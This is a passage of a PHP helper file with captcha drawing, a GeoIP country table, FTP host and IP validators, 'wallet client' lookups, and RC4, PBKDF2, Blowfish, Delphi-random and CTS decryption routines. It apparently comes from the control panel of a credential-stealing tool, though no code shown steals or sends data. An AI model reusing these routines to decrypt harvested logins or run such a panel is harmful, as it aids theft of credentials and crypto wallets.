            $Colors[] = imagecolorallocate($CaptchaIMG, $LineColor['r'], $LineColor['g'], $LineColor['b']);
        }

        for ($i = 0; $i < $Line_['Intensity']; $i++)
        {
            imagesetthickness($CaptchaIMG, rand(1, 5));
            imagearc($CaptchaIMG,
                     rand($Line_['Min'], $Line_['Max']),
                     rand($Line_['Min'], $Line_['Max']),
                     rand($Line_['Min'], $Line_['Max']),
                     rand($Line_['Min'], $Line_['Max']),
                     rand($Line_['Min'], $Line_['Max']),
                     rand($Line_['Min'], $Line_['Max']), $Colors[rand(0, sizeof($Colors) - 1)]);
            //rand($Line_['Min'], $Line_['Max']), (rand(0, 1) ? $Black : $White));
        }

        unset($Colors);
    }

    //dots
    if($Dots_['Dots'])
    {
        $Colors = array();
        foreach($Dots_['Color'] as $Key => $Value)
        {
            $DotsColor = hex2rgb($Value);
            $Colors[] = imagecolorallocate($CaptchaIMG, $DotsColor['r'], $DotsColor['g'], $DotsColor['b']);
        }

        for ($i = 0; $i < $Dots_['Intensity']; $i++)
        {
            imagesetpixel($CaptchaIMG, rand() % $Dots_['X'], rand() % $Dots_['Y'], $Colors[rand(0, sizeof($Colors) - 1)]);
        }

        unset($Colors);
    }

    if($Line2_['Line2'])
    {
        $Colors = array();
        foreach($Line2_['Color'] as $Key => $Value)
        {
            $Line2Color = hex2rgb($Value);
            $Colors[] = imagecolorallocate($CaptchaIMG, $Line2Color['r'], $Line2Color['g'], $Line2Color['b']);
        }

        for ($i = 0; $i < $Line2_['Intensity']; $i++)
        {
            imageline($CaptchaIMG, 0, rand() % 90, 150, rand() % 20, $Colors[rand(0, sizeof($Colors) - 1)]);
            //bool imageline ( resource $image , int $x1 , int $y1 , int $x2 , int $y2 , int $color )
        }

        unset($Colors);
    }

    ob_start();
    imagepng($CaptchaIMG);
    $ImageData = ob_get_contents();
    ob_end_clean();

    return array('code' => $Code, 'encrypted' => EncryptCaptcha($Code), 'image' => base64_encode($ImageData));
}

function PrintTable($Title, $Data = array(), $SizeA = "70%", $SizeB = "30%")
{
    echo '<div style="max-width: 680px; padding-bottom: 15px;">
    <table style="border: 1px solid #dddddd; border-radius: 1px;" class="table table-hover borderless">
    <thead>
    <tr>
    <th style="width:'.$SizeA.'">' .$Title. '</th>
    <th style="width:'.$SizeB.'"></th>
    </tr>
    </thead>
    <tbody>';

    foreach($Data as $Elements)
    {
        echo
        '<tr>
        <td>'.$Elements[0].'</td>
        <td>'.$Elements[1].'</td>
        </tr>';
    }

    echo '</tbody>
    </table>
    </div>';
}

function GetCountrys()
{
    $GEOIP_COUNTRY_CODES = array("AP", "EU", "AD", "AE", "AF", "AG", "AI", "AL", "AM", "CW", "AO", "AQ", "AR", "AS", "AT", "AU", "AW", "AZ", "BA", "BB", "BD", "BE", "BF", "BG", "BH", "BI", "BJ", "BM", "BN", "BO", "BR", "BS", "BT", "BV", "BW", "BY", "BZ", "CA", "CC", "CD", "CF", "CG", "CH", "CI", "CK", "CL", "CM", "CN", "CO", "CR", "CU", "CV", "CX", "CY", "CZ", "DE", "DJ", "DK", "DM", "DO", "DZ", "EC", "EE", "EG", "EH", "ER", "ES", "ET", "FI", "FJ", "FK", "FM", "FO", "FR", "SX", "GA", "GB", "GD", "GE", "GF", "GH", "GI", "GL", "GM", "GN", "GP", "GQ", "GR", "GS", "GT", "GU", "GW", "GY", "HK", "HM", "HN", "HR", "HT", "HU", "ID", "IE", "IL", "IN", "IO", "IQ", "IR", "IS", "IT", "JM", "JO", "JP", "KE", "KG", "KH", "KI", "KM", "KN", "KP", "KR", "KW", "KY", "KZ", "LA", "LB", "LC", "LI", "LK", "LR", "LS", "LT", "LU", "LV", "LY", "MA", "MC", "MD", "MG", "MH", "MK", "ML", "MM", "MN", "MO", "MP", "MQ", "MR", "MS", "MT", "MU", "MV", "MW", "MX", "MY", "MZ", "NA", "NC", "NE", "NF", "NG", "NI", "NL", "NO", "NP", "NR", "NU", "NZ", "OM", "PA", "PE", "PF", "PG", "PH", "PK", "PL", "PM", "PN", "PR", "PS", "PT", "PW", "PY", "QA", "RE", "RO", "RU", "RW", "SA", "SB", "SC", "SD", "SE", "SG", "SH", "SI", "SJ", "SK", "SL", "SM", "SN", "SO", "SR", "ST", "SV", "SY", "SZ", "TC", "TD", "TF", "TG", "TH", "TJ", "TK", "TM", "TN", "TO", "TL", "TR", "TT", "TV", "TW", "TZ", "UA", "UG", "UM", "US", "UY", "UZ", "VA", "VC", "VE", "VG", "VI", "VN", "VU", "WF", "WS", "YE", "YT", "RS", "ZA", "ZM", "ME", "ZW", "A1", "A2", "O1", "AX", "GG", "IM", "JE", "BL", "MF", "BQ", "SS", "O1", "XX");
    $GEOIP_COUNTRY_NAMES = array("Asia/Pacific Region", "Europe", "Andorra", "United Arab Emirates", "Afghanistan", "Antigua and Barbuda", "Anguilla", "Albania", "Armenia", "Curacao", "Angola", "Antarctica", "Argentina", "American Samoa", "Austria", "Australia", "Aruba", "Azerbaijan", "Bosnia and Herzegovina", "Barbados", "Bangladesh", "Belgium", "Burkina Faso", "Bulgaria", "Bahrain", "Burundi", "Benin", "Bermuda", "Brunei Darussalam", "Bolivia", "Brazil", "Bahamas", "Bhutan", "Bouvet Island", "Botswana", "Belarus", "Belize", "Canada", "Cocos (Keeling) Islands", "Congo, The Democratic Republic of the", "Central African Republic", "Congo", "Switzerland", "Cote D'Ivoire", "Cook Islands", "Chile", "Cameroon", "China", "Colombia", "Costa Rica", "Cuba", "Cape Verde", "Christmas Island", "Cyprus", "Czech Republic", "Germany", "Djibouti", "Denmark", "Dominica", "Dominican Republic", "Algeria", "Ecuador", "Estonia", "Egypt", "Western Sahara", "Eritrea", "Spain", "Ethiopia", "Finland", "Fiji", "Falkland Islands (Malvinas)", "Micronesia, Federated States of", "Faroe Islands", "France", "Sint Maarten (Dutch part)", "Gabon", "United Kingdom", "Grenada", "Georgia", "French Guiana", "Ghana", "Gibraltar", "Greenland", "Gambia", "Guinea", "Guadeloupe", "Equatorial Guinea", "Greece", "South Georgia and the South Sandwich Islands", "Guatemala", "Guam", "Guinea-Bissau", "Guyana", "Hong Kong", "Heard Island and McDonald Islands", "Honduras", "Croatia", "Haiti", "Hungary", "Indonesia", "Ireland", "Israel", "India", "British Indian Ocean Territory", "Iraq", "Iran, Islamic Republic of", "Iceland", "Italy", "Jamaica", "Jordan", "Japan", "Kenya", "Kyrgyzstan", "Cambodia", "Kiribati", "Comoros", "Saint Kitts and Nevis", "Korea, Democratic People's Republic of", "Korea, Republic of", "Kuwait", "Cayman Islands", "Kazakhstan", "Lao People's Democratic Republic", "Lebanon", "Saint Lucia", "Liechtenstein", "Sri Lanka", "Liberia", "Lesotho", "Lithuania", "Luxembourg", "Latvia", "Libya", "Morocco", "Monaco", "Moldova, Republic of", "Madagascar", "Marshall Islands", "Macedonia", "Mali", "Myanmar", "Mongolia", "Macau", "Northern Mariana Islands", "Martinique", "Mauritania", "Montserrat", "Malta", "Mauritius", "Maldives", "Malawi", "Mexico", "Malaysia", "Mozambique", "Namibia", "New Caledonia", "Niger", "Norfolk Island", "Nigeria", "Nicaragua", "Netherlands", "Norway", "Nepal", "Nauru", "Niue", "New Zealand", "Oman", "Panama", "Peru", "French Polynesia", "Papua New Guinea", "Philippines", "Pakistan", "Poland", "Saint Pierre and Miquelon", "Pitcairn Islands", "Puerto Rico", "Palestinian Territory", "Portugal", "Palau", "Paraguay", "Qatar", "Reunion", "Romania", "Russian Federation", "Rwanda", "Saudi Arabia", "Solomon Islands", "Seychelles", "Sudan", "Sweden", "Singapore", "Saint Helena", "Slovenia", "Svalbard and Jan Mayen", "Slovakia", "Sierra Leone", "San Marino", "Senegal", "Somalia", "Suriname", "Sao Tome and Principe", "El Salvador", "Syrian Arab Republic", "Swaziland", "Turks and Caicos Islands", "Chad", "French Southern Territories", "Togo", "Thailand", "Tajikistan", "Tokelau", "Turkmenistan", "Tunisia", "Tonga", "Timor-Leste", "Turkey", "Trinidad and Tobago", "Tuvalu", "Taiwan", "Tanzania, United Republic of", "Ukraine", "Uganda", "United States Minor Outlying Islands", "United States", "Uruguay", "Uzbekistan", "Holy See (Vatican City State)", "Saint Vincent and the Grenadines", "Venezuela", "Virgin Islands, British", "Virgin Islands, U.S.", "Vietnam", "Vanuatu", "Wallis and Futuna", "Samoa", "Yemen", "Mayotte", "Serbia", "South Africa", "Zambia", "Montenegro", "Zimbabwe", "Anonymous Proxy", "Satellite Provider", "Other", "Aland Islands", "Guernsey", "Isle of Man", "Jersey", "Saint Barthelemy", "Saint Martin", "Bonaire, Saint Eustatius and Saba", "South Sudan", "Other", "Unknown");
    $GEOIP_CONTINENT_CODES = array( "AS", "EU", "EU", "AS", "AS", "NA", "NA", "EU", "AS", "NA", "AF", "AN", "SA", "OC", "EU", "OC", "NA", "AS", "EU", "NA", "AS", "EU", "AF", "EU", "AS", "AF", "AF", "NA", "AS", "SA", "SA", "NA", "AS", "AN", "AF", "EU", "NA", "NA", "AS", "AF", "AF", "AF", "EU", "AF", "OC", "SA", "AF", "AS", "SA", "NA", "NA", "AF", "AS", "AS", "EU", "EU", "AF", "EU", "NA", "NA", "AF", "SA", "EU", "AF", "AF", "AF", "EU", "AF", "EU", "OC", "SA", "OC", "EU", "EU", "NA", "AF", "EU", "NA", "AS", "SA", "AF", "EU", "NA", "AF", "AF", "NA", "AF", "EU", "AN", "NA", "OC", "AF", "SA", "AS", "AN", "NA", "EU", "NA", "EU", "AS", "EU", "AS", "AS", "AS", "AS", "AS", "EU", "EU", "NA", "AS", "AS", "AF", "AS", "AS", "OC", "AF", "NA", "AS", "AS", "AS", "NA", "AS", "AS", "AS", "NA", "EU", "AS", "AF", "AF", "EU", "EU", "EU", "AF", "AF", "EU", "EU", "AF", "OC", "EU", "AF", "AS", "AS", "AS", "OC", "NA", "AF", "NA", "EU", "AF", "AS", "AF", "NA", "AS", "AF", "AF", "OC", "AF", "OC", "AF", "NA", "EU", "EU", "AS", "OC", "OC", "OC", "AS", "NA", "SA", "OC", "OC", "AS", "AS", "EU", "NA", "OC", "NA", "AS", "EU", "OC", "SA", "AS", "AF", "EU", "EU", "AF", "AS", "OC", "AF", "AF", "EU", "AS", "AF", "EU", "EU", "EU", "AF", "EU", "AF", "AF", "SA", "AF", "NA", "AS", "AF", "NA", "AF", "AN", "AF", "AS", "AS", "OC", "AS", "AF", "OC", "AS", "EU", "NA", "OC", "AS", "AF", "EU", "AF", "OC", "NA", "SA", "AS", "EU", "NA", "SA", "NA", "NA", "AS", "OC", "OC", "OC", "AS", "AF", "EU", "AF", "AF", "EU", "AF", "--", "--", "--", "EU", "EU", "EU", "EU", "NA", "NA", "NA", "AF", "--", "--");

    $Result = array();
    $i = 0;
    while(sizeof($GEOIP_COUNTRY_CODES) > $i)
    {
        $Result[strtolower($GEOIP_COUNTRY_CODES[$i])] = array('Country' => $GEOIP_COUNTRY_NAMES[$i],'Continent' => $GEOIP_CONTINENT_CODES[$i]);
        $i++;
    }

    return $Result;
}


function GetClient($Index)
{
    global $DBCall;
    return $DBCall[$Index][1];
}
function GetWalletClient($Index)
{
    global $DBWalletCall;
    return $DBWalletCall[$Index];
}

function IsDownload($Index)
{
    global $DBCall;
    return $DBCall[$Index][2];
}
function idiv($x, $y)
{
    if ($x == 0)
        return 0;
    if ($y == 0)
        return FALSE;
    return ($x - ($x % $y)) / $y;
}

function strip_quotes($s)
{
    if (!$s)
        return "";
    if ($s[0] == '"')
    {
        return substr($s, 1, -1);
    }
    else
        return $s;
}
function is_valid_host($host)
{
    global $global_allow_all_ftp;
    if ($global_allow_all_ftp)
        return true;

    if (preg_match('/^([a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,6}$/', $host))
        return true;
    else
        return false;
}

function IsNum($s)
{
    return (preg_match("/^([0-9])+$/", $s));
}

// validate IP
function is_valid_ip($ip)
{
    global $global_allow_all_ftp;
    if ($global_allow_all_ftp)
        return true;

    if (preg_match('/^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$/', $ip))
        return true;
    else
        return false;
}

function nonempty(&$var)
{
    return (isset($var) && $var);
}

function assign_trim(&$value)
{
    return trim(assign($value));
}

function str_begins($string, $start_substr)
{
    return (strtolower(substr($string, 0, strlen($start_substr))) === $start_substr);
}

function str_ends($string, $start_substr)
{
    return (strtolower(substr($string, -strlen($start_substr))) === $start_substr);
}
function RC4__($key, $str)
{
    $s = array();
    for ($i = 0; $i < 256; $i++)
    {
        $s[$i] = $i;
    }
    $j = 0;
    for ($i = 0; $i < 256; $i++)
    {
        $j = ($j + $s[$i] + ord($key[$i % strlen($key)])) % 256;
        $x = $s[$i];
        $s[$i] = $s[$j];
        $s[$j] = $x;
    }
    $i = 0;
    $j = 0;
    $res = '';
    for ($y = 0; $y < strlen($str); $y++)
    {
        $i = ($i + 1) % 256;
        $j = ($j + $s[$i]) % 256;
        $x = $s[$i];
        $s[$i] = $s[$j];
        $s[$j] = $x;
        $res .= $str[$y] ^ chr($s[($s[$i] + $s[$j]) % 256]);
    }
    return $res;
}

function is_valid_ip_filter($ip)
{
    /*global $global_allow_all_ftp;
    if ($global_allow_all_ftp)
    	return true;
    */
    if (!is_valid_ip($ip))
        return false;

    $ip_values = preg_split("/[.]/", $ip);

    for ($i = 0; $i < 4; $i++)
        $ip_values[$i] = intval($ip_values[$i]);

    if ($ip_values[0] == 10)
        return false;

    if ($ip_values[0] == 172 && $ip_values[1] >= 16 && $ip_values[1] <= 31)
        return false;

    return true;
}
function Int32($Source)
{
    return (int) ((int) ord($Source[3]) << 24 | (int) ord($Source[2]) << 16 | (int) ord($Source[1]) << 8 | (int) ord($Source[0])) & 0xffffffff;
}

function BigInt32($Source)
{
    return (int) ((int) ord($Source[3]) << 24 | (int) ord($Source[2]) << 16 | (int) ord($Source[1]) << 8 | (int) ord($Source[0])) & 0xffffffff;
}

function LittleInt32($Source)
{
    return (int) ((int) ord($Source[0]) << 24 | (int) ord($Source[1]) << 16 | (int) ord($Source[2]) << 8 | (int) ord($Source[3])) & 0xffffffff;
}

function xor_block($b1, $b2)
{
    for ($i = 0; $i < min(strlen($b1), strlen($b2)); $i++)
        $b1[$i] = chr(ord($b1[$i]) ^ ord($b2[$i]));
    return $b1;
}

function Assign_(&$Source, $Trim = TRUE, $UTF8_ = TRUE, $NULL_ = FALSE)
{
    if(isset($Source) && strlen($Source))
    {
        if($Trim)
            $Source = trim($Source);

        if($UTF8_)
            $Source = utf8_encode($Source);
		
        return $Source;
    }
	
	if($NULL_)
		return NULL;

    return '';
}

function parse_lines($value)
{
    return preg_split("/((\r(?!\n))|((?<!\r)\n)|(\r\n))/", $value);
}

function parse_ini($ini)
{
    // split lines
    $ini = parse_lines($ini);

    if (count($ini) == 0)
        return array();

    $result = array();
    $sections = array();
    $values = array();
    $globals = array();
    $i = 0;
    foreach ($ini as $line)
    {
        $line = trim($line);

        // Comments, do not parse line
        if ($line == '' || $line {0} == ';')
            continue;

        // Sections
        if ($line {0} == '[')
        {
            $sections[] = substr($line, 1, -1);
            $i++;
            continue;
        }

        // Key-value pair
        if (strpos($line, '=') === false)
        {
            $key = $line;
            $value = '';
        }
        else
            list($key, $value) = explode('=', $line, 2);
        $key = trim($key);
        $value = trim($value);
        if ($i == 0)
        {
            // Array values
            if (substr($line, -1, 2) == '[]')
            {
                $globals[$key][] = $value;
            }
            else
            {
                $globals[$key] = $value;
            }
        }
        else
        {
            // Array values
            if (substr($line, -1, 2) == '[]')
            {
                $values[$i - 1][$key][] = $value;
            }
            else
            {
                $values[$i - 1][$key] = $value;
            }
        }
    }
    foreach ($values as $key => $value)
    $result[$sections[$key]] = $value;
    return $result + $globals;
}
function remove_utf8_bom($text)
{
    $bom = pack('H*','EFBBBF');
    $text = preg_replace("/^$bom/", '', $text);
    return $text;
}

function PBKDF1($Pass, $Salt, $It, $DKLen)
{
    $Key = $Pass.$Salt;

    for($i=1; $i <= $It; $i++)
        $Key = sha1($Key, true);

    return substr($Key, 0, $DKLen);
}

function Rfc2898DeriveBytes($p, $s, $c, $kl, $a = 'sha1')
{
	
	return pbkdf2( $p, $s, $c, $kl, $a);
}

function pbkdf2( $p, $s, $c, $kl, $a = 'sha1' )  //Rfc2898DeriveBytes
{

    $hl = strlen(hash($a, null, true)); # Hash length
    $kb = ceil($kl / $hl);              # Key blocks to compute
    $dk = '';                           # Derived key

    for ( $block = 1; $block <= $kb; $block ++ ) 
	{
		
        $ib = $b = hash_hmac($a, $s . pack('N', $block), $p, true);
		
        for ( $i = 1; $i < $c; $i ++ )
            $ib ^= ($b = hash_hmac($a, $b, $p, true));

        $dk .= $ib;
    }
	
    return substr($dk, 0, $kl);
}

define('UTF32_BIG_ENDIAN_BOM', chr(0x00) . chr(0x00) . chr(0xFE) . chr(0xFF));
define('UTF32_LITTLE_ENDIAN_BOM', chr(0xFF) . chr(0xFE) . chr(0x00) . chr(0x00));
define('UTF16_BIG_ENDIAN_BOM', chr(0xFE) . chr(0xFF));
define('UTF16_LITTLE_ENDIAN_BOM', chr(0xFF) . chr(0xFE));
define('UTF8_BOM', chr(0xEF) . chr(0xBB) . chr(0xBF));

function detect_utf_encoding($text)
{
    $first2 = substr($text, 0, 2);
    $first3 = substr($text, 0, 3);
    $first4 = substr($text, 0, 4);

    if ($first3 == UTF8_BOM)
        return 'UTF-8';
    elseif ($first4 == UTF32_BIG_ENDIAN_BOM)
    return 'UTF-32BE';
    elseif ($first4 == UTF32_LITTLE_ENDIAN_BOM)
    return 'UTF-32LE';
    elseif ($first2 == UTF16_BIG_ENDIAN_BOM)
    return 'UTF-16BE';
    elseif ($first2 == UTF16_LITTLE_ENDIAN_BOM)
    return 'UTF-16LE';

    return "auto";
}
function unicode_to_ansi($string)
{
    if (!strlen($string))
        return '';

    // check for unicode length validness
    if (strlen($string) % 2 != 0)
    {
        return '';
    }


    return mb_convert_encoding($string, "cp1251", "UTF-16LE");
}
// Convert unknown-encoded text into CP1251
// correct UTF encoding is extracted from the data header, see detect_utf_encoding() function
function UnkTextToAnsi($string)
{
    $encoding = detect_utf_encoding($string);

    // remove utf header character
    switch ($encoding)
    {
    case "UTF-8":
        $string = substr($string, 3);
        break;
    case "UTF-32BE":
        $string = substr($string, 4);
        break;
    case "UTF-32LE":
        $string = substr($string, 4);
        break;
    case "UTF-16BE":
        $string = substr($string, 2);
        break;
    case "UTF-16LE":
        $string = substr($string, 2);
        break;
    default:
        // cannot detect text encoding, utf header character missing
        return $string;
    }

    return mb_convert_encoding($string, "cp1251", $encoding);
}

function rc4Encrypt($key, $pt)
{
    if (!strlen($key))
        return $pt;
    $s = array();
    for ($i = 0; $i < 256; $i++)
        $s[$i] = $i;
    $j = 0;
    $x;
    for ($i = 0; $i < 256; $i++)
    {
        $j = ($j + $s[$i] + ord($key[$i % strlen($key)])) % 256;
        $x = $s[$i];
        $s[$i] = $s[$j];
        $s[$j] = $x;
    }
    $i = 0;
    $j = 0;
    $ct = '';
    $y;
    for ($y = 0; $y < strlen($pt); $y++)
    {
        $i = ($i + 1) % 256;
        $j = ($j + $s[$i]) % 256;
        $x = $s[$i];
        $s[$i] = $s[$j];
        $s[$j] = $x;
        $ct .= $pt[$y] ^ chr($s[($s[$i] + $s[$j]) % 256]);
    }
    return $ct;
}

/**
 * Decrypt given cipher text using the key with RC4 algorithm.
 * All parameters and return value are in binary format.
 *
 * @param string key - secret key for decryption
 * @param string ct - cipher text to be decrypted
 * @return string
 */
function rc4Decrypt($key, $ct)
{
    return rc4Encrypt($key, $ct);
}
function _BF_SHR32($x, $bits)
{
    if ($bits == 0)
        return $x;
    if ($bits == 32)
        return 0;
    $y = ($x & 0x7FFFFFFF) >> $bits;
    if (0x80000000 & $x)
    {
        $y |= (1 << (31 - $bits));
    }
    return $y;
}

function _BF_SHL32($x, $bits)
{
    if ($bits == 0)
        return $x;
    if ($bits == 32)
        return 0;
    $mask = (1 << (32 - $bits)) - 1;
    return (($x & $mask) << $bits) & 0xFFFFFFFF;
}

function _BF_GETBYTE($x, $y)
{
    return _BF_SHR32($x, 8 * $y) & 0xFF;
}

function _BF_OR32($x, $y)
{
    return ($x | $y) & 0xFFFFFFFF;
}

function _BF_ADD32($x, $y)
{

    $x = $x & 0xFFFFFFFF;
    $y = $y & 0xFFFFFFFF;

    $total = 0;
    $carry = 0;
    for ($i = 0; $i < 4; $i++)
    {
        $byte_x = _BF_GETBYTE($x, $i);
        $byte_y = _BF_GETBYTE($y, $i);
        $sum = $byte_x + $byte_y;

        $result = $sum & 0xFF;
        $carryforward = _BF_SHR32($sum, 8);

        $sum = $result + $carry;
        $result = $sum & 0xFF;
        $carry = $carryforward + _BF_SHR32($sum, 8);

        $total = _BF_OR32(_BF_SHL32($result, $i * 8), $total);
    }

    return $total;
}

function _BF_SUB32($x, $y)
{
    return _BF_ADD32($x, -$y);
}

function _BF_XOR32($x, $y)
{
    $x = $x & 0xFFFFFFFF;
    $y = $y & 0xFFFFFFFF;
    return $x ^ $y;
}

function int3tostr($x)
{
    if (!preg_match("/^([0-9]{3})+$/", $x))
        return false;
    $s = '';
    foreach (explode("\n", trim(chunk_split($x, 3))) as $h)
    $s .= chr(intval($h));
    return($s);
}

// shift left
function gmp_shiftl($x, $n)
{
    return(gmp_mul($x, gmp_pow(2, $n)));
}

// shift right
function gmp_shiftr($x, $n)
{
    return(gmp_div($x, gmp_pow(2, $n)));
}

function myrand($max, &$seed)
{
    $seed = hexdec(gmp_strval(gmp_and(gmp_add(gmp_mul("$seed", "0x8088405"), "1"), "0xffffffff"), 16));
    $v = hexdec(gmp_strval(gmp_and(gmp_shiftr(gmp_mul("0x" . dechex($seed), "$max"), "32"), "0xffffffff"), 16));
    return $v;
}

function crc32b_str($data)
{
    $CRC32Table = array(
                      (int) 0x00000000, (int) 0x77073096, (int) 0xEE0E612C, (int) 0x990951BA, (int) 0x076DC419, (int) 0x706AF48F, (int) 0xE963A535,
                      (int) 0x9E6495A3, (int) 0x0EDB8832, (int) 0x79DCB8A4, (int) 0xE0D5E91E, (int) 0x97D2D988, (int) 0x09B64C2B, (int) 0x7EB17CBD,
                      (int) 0xE7B82D07, (int) 0x90BF1D91, (int) 0x1DB71064, (int) 0x6AB020F2, (int) 0xF3B97148, (int) 0x84BE41DE, (int) 0x1ADAD47D,
                      (int) 0x6DDDE4EB, (int) 0xF4D4B551, (int) 0x83D385C7, (int) 0x136C9856, (int) 0x646BA8C0, (int) 0xFD62F97A, (int) 0x8A65C9EC,
                      (int) 0x14015C4F, (int) 0x63066CD9, (int) 0xFA0F3D63, (int) 0x8D080DF5, (int) 0x3B6E20C8, (int) 0x4C69105E, (int) 0xD56041E4,
                      (int) 0xA2677172, (int) 0x3C03E4D1, (int) 0x4B04D447, (int) 0xD20D85FD, (int) 0xA50AB56B, (int) 0x35B5A8FA, (int) 0x42B2986C,
                      (int) 0xDBBBC9D6, (int) 0xACBCF940, (int) 0x32D86CE3, (int) 0x45DF5C75, (int) 0xDCD60DCF, (int) 0xABD13D59, (int) 0x26D930AC,
                      (int) 0x51DE003A, (int) 0xC8D75180, (int) 0xBFD06116, (int) 0x21B4F4B5, (int) 0x56B3C423, (int) 0xCFBA9599, (int) 0xB8BDA50F,
                      (int) 0x2802B89E, (int) 0x5F058808, (int) 0xC60CD9B2, (int) 0xB10BE924, (int) 0x2F6F7C87, (int) 0x58684C11, (int) 0xC1611DAB,
                      (int) 0xB6662D3D, (int) 0x76DC4190, (int) 0x01DB7106, (int) 0x98D220BC, (int) 0xEFD5102A, (int) 0x71B18589, (int) 0x06B6B51F,
                      (int) 0x9FBFE4A5, (int) 0xE8B8D433, (int) 0x7807C9A2, (int) 0x0F00F934, (int) 0x9609A88E, (int) 0xE10E9818, (int) 0x7F6A0DBB,
                      (int) 0x086D3D2D, (int) 0x91646C97, (int) 0xE6635C01, (int) 0x6B6B51F4, (int) 0x1C6C6162, (int) 0x856530D8, (int) 0xF262004E,
                      (int) 0x6C0695ED, (int) 0x1B01A57B, (int) 0x8208F4C1, (int) 0xF50FC457, (int) 0x65B0D9C6, (int) 0x12B7E950, (int) 0x8BBEB8EA,
                      (int) 0xFCB9887C, (int) 0x62DD1DDF, (int) 0x15DA2D49, (int) 0x8CD37CF3, (int) 0xFBD44C65, (int) 0x4DB26158, (int) 0x3AB551CE,
                      (int) 0xA3BC0074, (int) 0xD4BB30E2, (int) 0x4ADFA541, (int) 0x3DD895D7, (int) 0xA4D1C46D, (int) 0xD3D6F4FB, (int) 0x4369E96A,
                      (int) 0x346ED9FC, (int) 0xAD678846, (int) 0xDA60B8D0, (int) 0x44042D73, (int) 0x33031DE5, (int) 0xAA0A4C5F, (int) 0xDD0D7CC9,
                      (int) 0x5005713C, (int) 0x270241AA, (int) 0xBE0B1010, (int) 0xC90C2086, (int) 0x5768B525, (int) 0x206F85B3, (int) 0xB966D409,
                      (int) 0xCE61E49F, (int) 0x5EDEF90E, (int) 0x29D9C998, (int) 0xB0D09822, (int) 0xC7D7A8B4, (int) 0x59B33D17, (int) 0x2EB40D81,
                      (int) 0xB7BD5C3B, (int) 0xC0BA6CAD, (int) 0xEDB88320, (int) 0x9ABFB3B6, (int) 0x03B6E20C, (int) 0x74B1D29A, (int) 0xEAD54739,
                      (int) 0x9DD277AF, (int) 0x04DB2615, (int) 0x73DC1683, (int) 0xE3630B12, (int) 0x94643B84, (int) 0x0D6D6A3E, (int) 0x7A6A5AA8,
                      (int) 0xE40ECF0B, (int) 0x9309FF9D, (int) 0x0A00AE27, (int) 0x7D079EB1, (int) 0xF00F9344, (int) 0x8708A3D2, (int) 0x1E01F268,
                      (int) 0x6906C2FE, (int) 0xF762575D, (int) 0x806567CB, (int) 0x196C3671, (int) 0x6E6B06E7, (int) 0xFED41B76, (int) 0x89D32BE0,
                      (int) 0x10DA7A5A, (int) 0x67DD4ACC, (int) 0xF9B9DF6F, (int) 0x8EBEEFF9, (int) 0x17B7BE43, (int) 0x60B08ED5, (int) 0xD6D6A3E8,
                      (int) 0xA1D1937E, (int) 0x38D8C2C4, (int) 0x4FDFF252, (int) 0xD1BB67F1, (int) 0xA6BC5767, (int) 0x3FB506DD, (int) 0x48B2364B,
                      (int) 0xD80D2BDA, (int) 0xAF0A1B4C, (int) 0x36034AF6, (int) 0x41047A60, (int) 0xDF60EFC3, (int) 0xA867DF55, (int) 0x316E8EEF,
                      (int) 0x4669BE79, (int) 0xCB61B38C, (int) 0xBC66831A, (int) 0x256FD2A0, (int) 0x5268E236, (int) 0xCC0C7795, (int) 0xBB0B4703,
                      (int) 0x220216B9, (int) 0x5505262F, (int) 0xC5BA3BBE, (int) 0xB2BD0B28, (int) 0x2BB45A92, (int) 0x5CB36A04, (int) 0xC2D7FFA7,
                      (int) 0xB5D0CF31, (int) 0x2CD99E8B, (int) 0x5BDEAE1D, (int) 0x9B64C2B0, (int) 0xEC63F226, (int) 0x756AA39C, (int) 0x026D930A,
                      (int) 0x9C0906A9, (int) 0xEB0E363F, (int) 0x72076785, (int) 0x05005713, (int) 0x95BF4A82, (int) 0xE2B87A14, (int) 0x7BB12BAE,
                      (int) 0x0CB61B38, (int) 0x92D28E9B, (int) 0xE5D5BE0D, (int) 0x7CDCEFB7, (int) 0x0BDBDF21, (int) 0x86D3D2D4, (int) 0xF1D4E242,
                      (int) 0x68DDB3F8, (int) 0x1FDA836E, (int) 0x81BE16CD, (int) 0xF6B9265B, (int) 0x6FB077E1, (int) 0x18B74777, (int) 0x88085AE6,
                      (int) 0xFF0F6A70, (int) 0x66063BCA, (int) 0x11010B5C, (int) 0x8F659EFF, (int) 0xF862AE69, (int) 0x616BFFD3, (int) 0x166CCF45,
                      (int) 0xA00AE278, (int) 0xD70DD2EE, (int) 0x4E048354, (int) 0x3903B3C2, (int) 0xA7672661, (int) 0xD06016F7, (int) 0x4969474D,
                      (int) 0x3E6E77DB, (int) 0xAED16A4A, (int) 0xD9D65ADC, (int) 0x40DF0B66, (int) 0x37D83BF0, (int) 0xA9BCAE53, (int) 0xDEBB9EC5,
                      (int) 0x47B2CF7F, (int) 0x30B5FFE9, (int) 0xBDBDF21C, (int) 0xCABAC28A, (int) 0x53B39330, (int) 0x24B4A3A6, (int) 0xBAD03605,
                      (int) 0xCDD70693, (int) 0x54DE5729, (int) 0x23D967BF, (int) 0xB3667A2E, (int) 0xC4614AB8, (int) 0x5D681B02, (int) 0x2A6F2B94,
                      (int) 0xB40BBE37, (int) 0xC30C8EA1, (int) 0x5A05DF1B, (int) 0x2D02EF8D);

    $remainder = 0xffffffff;
    $len = strlen($data);
    for ($i = 0; $i < $len; $i++)
    {
        $index = (ord($data[$i]) ^ $remainder) & 0xff;
        $crc = $CRC32Table[$index];
        $remainder = (($remainder >> 8) & 0xffffff) ^ $crc;
    }

    return $remainder;
}

function data_int32($data)
{
    return (int) (
               (int) ord($data[3]) << 24 |
               (int) ord($data[2]) << 16 |
               (int) ord($data[1]) << 8 |
               (int) ord($data[0])) & 0xffffffff;
}

function ztrim($data)
{
    for ($i = 0; $i < strlen($data); $i++)
        if ($data[$i] == chr(0))
        {
            $data = substr($data, 0, $i);
            break;
        }
    return $data;
}
// Implementation of (CTS) Ciphertext stealing mode (encryption) for mcrypt library
// 64-bit blocks only
// Padding is not implemented here, as it wasn't required for encryption process
function encrypt_cts($module, $data, &$iv)
{
    $outdata = "";
    for ($i = 0; $i < idiv(strlen($data), 8); $i++)
    {
        $p = substr($data, $i * 8, 8);
        $p = xor_block($p, $iv);
        $p = mcrypt_generic($module, $p);

        $outdata .= $p;

        $iv = xor_block($iv, $p);
    }

    return $outdata;
}

